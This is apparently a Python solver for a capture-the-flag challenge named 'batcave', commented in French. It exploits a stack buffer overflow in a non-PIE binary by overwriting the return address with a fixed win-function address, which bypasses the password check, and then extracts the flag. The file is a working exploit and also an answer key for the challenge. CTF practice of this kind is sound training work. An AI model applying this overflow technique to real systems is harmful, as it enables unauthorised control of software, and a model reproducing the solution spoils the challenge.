#!/usr/bin/env python3
"""
23x41's 0x8A7 -- BATCAVE ACCESS TERMINAL (batcave)
Non-PIE ELF64, SANS canary, SANS PIE (EXEC) -- ret2win direct.

Flow :
  check_password()
    read(0, buf, 0x200)          ; buf @ rbp-0x50 -- gros overflow
    strncmp(buf, "N1ghtw1ng_R3turns", 17)   ; leurre, jamais appelé si on ret2win

open_batcave() est déjà dans le binaire (adresse fixe 0x401186, pas de PIE) :
il suffit d'écraser l'adresse de retour de check_password pour y sauter,
aucun besoin de connaître ni de rejouer le mot de passe.

Overflow : buf[0x58] = adresse retour -> open_batcave (0x401186).
  rbp-0x50 (buf) ... rbp-0x50+0x50 = rbp (saved rbp, 8 octets)
  ... rbp+0x8 = adresse de retour -> offset total depuis buf = 0x58.

Usage :
    python3 tools/batcave-solve.py -q
    python3 tools/batcave-solve.py --check
"""
import argparse
import struct
import subprocess
import sys
from pathlib import Path

HERE = Path(__file__).resolve().parent
DEFAULT_BIN = HERE.parent / "original" / "batcave"

OPEN_BATCAVE = 0x401186
RET_OFFSET = 0x58


def build_payload() -> bytes:
    return b"A" * RET_OFFSET + struct.pack("<Q", OPEN_BATCAVE)


def solve(binary: Path):
    payload = build_payload()
    proc = subprocess.run(
        [str(binary)],
        input=payload + b"\n",
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        timeout=5,
    )
    return payload, proc.stdout


def main():
    ap = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--binary", type=Path, default=DEFAULT_BIN, help="chemin du binaire batcave")
    ap.add_argument("-q", "--quiet", action="store_true", help="n'affiche que le flag")
    ap.add_argument("--check", action="store_true", help="vérifie que le flag FLAG{...} est bien présent en sortie")
    args = ap.parse_args()

    payload, out = solve(args.binary)
    text = out.decode(errors="replace")

    flag = None
    for line in text.splitlines():
        if line.startswith("FLAG{"):
            flag = line.strip()
            break

    if args.quiet:
        print(flag or "<flag introuvable>")
    else:
        print(f"[+] payload ({len(payload)} octets) : {payload.hex()}")
        print("----- sortie du programme -----")
        print(text)
        print("--------------------------------")
        print(f"[+] flag : {flag}")

    if args.check:
        ok = flag is not None and flag.startswith("FLAG{")
        print("CHECK:", "OK" if ok else "FAIL", file=sys.stderr)
        sys.exit(0 if ok else 1)


if __name__ == "__main__":
    main()
